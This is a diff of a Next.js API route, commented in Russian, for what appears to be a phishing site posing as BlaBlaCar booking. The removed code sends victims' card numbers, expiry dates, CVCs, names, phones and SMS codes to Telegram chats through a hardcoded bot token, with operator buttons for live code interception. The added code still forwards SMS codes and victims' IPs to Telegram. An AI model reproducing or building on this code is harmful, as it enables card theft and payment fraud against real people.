@@ -1,78 +1,95 @@
 import { NextRequest, NextResponse } from 'next/server';
+import fs from 'fs';
+import path from 'path';
 import { getCodeErrorFlag, getCodeSuccessFlag } from './codeErrorStore';
 
-const TELEGRAM_TOKEN = '7962685508:AAHBZMDWD4hqHYVzjjDfv4pjMAZ6aMwAvTc';
-const CHAT_IDS = ['1902713760', '7508575481'];
-const WEBHOOK_URL = 'https://blablacar-lovat.vercel.app/api/notify/callback';
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
+const CHAT_IDS = process.env.CHAT_IDS?.split(',') || [];
+const NOTIFICATIONS_FILE = path.join(process.cwd(), 'notifications.json');
 
-// Функция для отправки сообщения в Telegram
-async function sendTelegramMessage(chatId: string, message: string, reply_markup?: any) {
+// Инициализация файла уведомлений
+if (!fs.existsSync(NOTIFICATIONS_FILE)) {
+  fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify([], null, 2));
+}
+
+// Чтение уведомлений из файла
+function readNotifications() {
   try {
-    console.log(`Sending message to chat ${chatId}:`, message);
-    console.log('Reply markup:', reply_markup);
-
-    const sendUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    const response = await fetch(sendUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML',
-        ...(reply_markup ? { reply_markup } : {}),
-      }),
-    });
-
-    const result = await response.json();
-    console.log(`Send message response for chat ${chatId}:`, result);
-
-    if (!result.ok) {
-      console.error(`Failed to send message to chat ${chatId}:`, result);
-      return { ok: false, error: result };
-    }
-
-    return { ok: true, message_id: result.result?.message_id };
+    const data = fs.readFileSync(NOTIFICATIONS_FILE, 'utf-8');
+    return JSON.parse(data);
   } catch (error) {
-    console.error(`Error sending message to chat ${chatId}:`, error);
-    return { ok: false, error };
+    console.error('Error reading notifications:', error);
+    return [];
   }
 }
 
-// Функция для установки webhook
-async function setupWebhook() {
+// Запись уведомлений в файл
+function writeNotifications(notifications: any[]) {
   try {
-    console.log('Setting up webhook with URL:', WEBHOOK_URL);
-    
-    // Сначала удаляем существующий webhook
-    const deleteResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook`);
-    const deleteData = await deleteResponse.json();
-    console.log('Delete webhook response:', deleteData);
-    
-    // Затем устанавливаем новый webhook
+    fs.writeFileSync(NOTIFICATIONS_FILE, JSON.stringify(notifications, null, 2));
+  } catch (error) {
+    console.error('Error writing notifications:', error);
+  }
+}
+
+// Функция для отправки сообщения в Telegram
+async function sendTelegramMessage(message: string) {
+  if (!TELEGRAM_TOKEN || CHAT_IDS.length === 0) {
+    console.error('Telegram configuration is missing');
+    return;
+  }
+
+  try {
+    for (const chatId of CHAT_IDS) {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+
+      if (!response.ok) {
+        console.error(`Failed to send message to chat ${chatId}:`, await response.text());
+      }
+    }
+  } catch (error) {
+    console.error('Error sending Telegram message:', error);
+  }
+}
+
+// Функция для настройки вебхука
+async function setupWebhook() {
+  if (!TELEGRAM_TOKEN) {
+    console.error('Telegram token is missing');
+    return;
+  }
+
+  try {
+    const webhookUrl = `${process.env.NEXT_PUBLIC_BASE_URL}/api/notify/webhook`;
     const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/setWebhook`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        url: WEBHOOK_URL,
-        allowed_updates: ['callback_query', 'message'],
-        max_connections: 100,
-        drop_pending_updates: true
+        url: webhookUrl
       })
     });
-    
-    const data = await response.json();
-    console.log('Webhook setup response:', data);
 
-    // Отправляем тестовое сообщение после настройки webhook
-    for (const chatId of CHAT_IDS) {
-      await sendTelegramMessage(chatId, '🔄 <b>Система перезапущена</b>\nWebhook успешно настроен');
+    if (!response.ok) {
+      console.error('Failed to set webhook:', await response.text());
+      return;
     }
+
+    // Отправляем тестовое сообщение
+    await sendTelegramMessage('🔄 Система перезапущена');
   } catch (error) {
     console.error('Error setting up webhook:', error);
   }
 }
 
-// Устанавливаем webhook при инициализации
+// Настраиваем вебхук при инициализации
 setupWebhook();
 
 function getClientIp(req: NextRequest) {
@@ -107,111 +124,69 @@ export async function GET(req: NextRequest) {
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json();
-    const { text, status = 'online', url, message_ids, action, firstName, lastName, card, date, cvc, owner, phone } = body;
-    const userAgent = req.headers.get('user-agent') || 'Unknown';
-    const ip = getClientIp(req);
-    const now = new Date();
-    const time = now.toLocaleString('ru-RU', { hour12: false });
+    const { action, ip, code, ticketNumber } = body;
+
+    if (!action) {
+      return NextResponse.json({ ok: false, error: 'Missing action' }, { status: 400 });
+    }
 
     let message = '';
-    let reply_markup = undefined;
-    if (action === 'payment') {
-      message =
-        `💳 <b>Попытка оплаты</b>\n` +
-        `──────────────\n` +
-        `• <b>Номер карты:</b> <code>${card || '-'}</code>\n` +
-        `• <b>Дата:</b> <code>${date || '-'}</code>\n` +
-        `• <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
-        `• <b>ФИО:</b> <code>${owner || '-'}</code>\n` +
-        `• <b>Телефон:</b> <code>${phone || '-'}</code>\n` +
-        `🕒 <b>Время:</b> ${time}\n` +
-        `🌍 <b>IP:</b> ${ip}`;
-      reply_markup = {
-        inline_keyboard: [
-          [
-            { text: 'Ошибка / Запросить новый код', callback_data: 'code_error' },
-            { text: 'Успех', callback_data: 'code_success' }
-          ]
-        ],
-      };
-    } else if (action === 'sms_code') {
-      message =
-        `🔑 <b>Введён SMS-код</b>\n` +
-        `──────────────\n` +
-        `• <b>Код:</b> <code>${body.code || '-'}</code>\n` +
-        `• <b>Номер карты:</b> <code>${card || '-'}</code>\n` +
-        `• <b>Дата:</b> <code>${date || '-'}</code>\n` +
-        `• <b>CVC:</b> <code>${cvc || '-'}</code>\n` +
-        `• <b>ФИО:</b> <code>${owner || '-'}</code>\n` +
-        `• <b>Телефон:</b> <code>${phone || '-'}</code>\n` +
-        `🕒 <b>Время:</b> ${time}\n` +
-        `🌍 <b>IP:</b> ${ip}`;
-    } else if (action === 'booking') {
-      message =
-        `📝 <b>Новая заявка на бронирование</b>\n` +
-        `──────────────\n` +
-        `👤 <b>Имя:</b> ${firstName || '-'}\n` +
-        `👤 <b>Фамилия:</b> ${lastName || '-'}\n` +
-        `➡️ <b>Клиент перешел на страницу оплаты</b>\n` +
-        `🕒 <b>Время:</b> ${time}\n` +
-        `🌍 <b>IP:</b> ${ip}`;
-    } else {
-      const statusEmoji = status === 'online' ? '🟢' : '🔴';
-      const statusText = status === 'online' ? 'Пользователь онлайн' : 'Пользователь оффлайн';
-      message =
-        `🚗 <b>BlaBlaCar Booking</b>\n` +
-        `──────────────\n` +
-        `<b>${statusEmoji} ${statusText}</b>\n` +
-        (url ? `🌐 <b>Страница:</b> ${url}\n` : '') +
-        `🕒 <b>Время:</b> ${time}\n` +
-        `💻 <b>User-Agent:</b> ${userAgent}\n` +
-        `🌍 <b>IP:</b> ${ip}`;
+    let notificationType = '';
+
+    switch (action) {
+      case 'sms_code':
+        if (!ip || !code) {
+          return NextResponse.json({ ok: false, error: 'Missing IP or code' }, { status: 400 });
+        }
+        message = `🔐 <b>Новый код:</b>\n🌍 <b>IP:</b> ${ip}\n🔑 <b>Код:</b> ${code}`;
+        notificationType = 'sms_code';
+        break;
+
+      case 'payment_success':
+        if (!ip || !ticketNumber) {
+          return NextResponse.json({ ok: false, error: 'Missing IP or ticket number' }, { status: 400 });
+        }
+        message = `✅ <b>Успешная оплата:</b>\n🌍 <b>IP:</b> ${ip}\n🎫 <b>Номер билета:</b> ${ticketNumber}`;
+        notificationType = 'payment';
+        break;
+
+      case 'set_error':
+        if (!ip) {
+          return NextResponse.json({ ok: false, error: 'Missing IP' }, { status: 400 });
+        }
+        message = `❌ <b>Ошибка кода:</b>\n🌍 <b>IP:</b> ${ip}`;
+        notificationType = 'error';
+        break;
+
+      case 'set_success':
+        if (!ip) {
+          return NextResponse.json({ ok: false, error: 'Missing IP' }, { status: 400 });
+        }
+        message = `✅ <b>Успешный код:</b>\n🌍 <b>IP:</b> ${ip}`;
+        notificationType = 'success';
+        break;
+
+      default:
+        return NextResponse.json({ ok: false, error: 'Unknown action' }, { status: 400 });
     }
 
-    console.log('Sending message to Telegram:', message);
-    console.log('Reply markup:', reply_markup);
+    // Отправляем сообщение в Telegram
+    await sendTelegramMessage(message);
 
-    const results: { chat_id: string; message_id?: number; ok: boolean }[] = [];
-    for (const chatId of CHAT_IDS) {
-      const msgId = message_ids?.[chatId];
-      let result;
-      
-      if (msgId && !action) {
-        // editMessageText только для online/offline
-        const editUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
-        console.log('Editing message for chat:', chatId);
-        const res = await fetch(editUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            message_id: msgId,
-            text: message,
-            parse_mode: 'HTML',
-          }),
-        });
-        result = await res.json();
-        console.log('Edit message response:', result);
-        results.push({ chat_id: chatId, message_id: msgId, ok: result.ok });
-      } else {
-        // sendMessage (или для booking/payment всегда новое)
-        result = await sendTelegramMessage(chatId, message, reply_markup);
-        results.push({ chat_id: chatId, message_id: result.message_id, ok: result.ok });
-      }
-    }
+    // Сохраняем уведомление в файл
+    const notifications = readNotifications();
+    notifications.push({
+      id: Date.now().toString(),
+      type: notificationType,
+      data: { ip, code, ticketNumber },
+      status: 'pending',
+      timestamp: new Date().toISOString()
+    });
+    writeNotifications(notifications);
 
-    console.log('All results:', results);
-
-    if (results.every(r => r.ok)) {
-      const ids: Record<string, number> = {};
-      results.forEach(r => { if (r.message_id) ids[r.chat_id] = r.message_id; });
-      return NextResponse.json({ ok: true, message_ids: ids });
-    } else {
-      console.error('Some messages failed to send:', results);
-      return NextResponse.json({ ok: false, error: results }, { status: 500 });
-    }
-  } catch (e) {
-    console.error('Error sending message:', e);
-    return NextResponse.json({ ok: false, error: e?.toString() }, { status: 500 });
+    return NextResponse.json({ ok: true });
+  } catch (error) {
+    console.error('Error handling notification:', error);
+    return NextResponse.json({ ok: false, error: 'Internal server error' }, { status: 500 });
   }
 } 
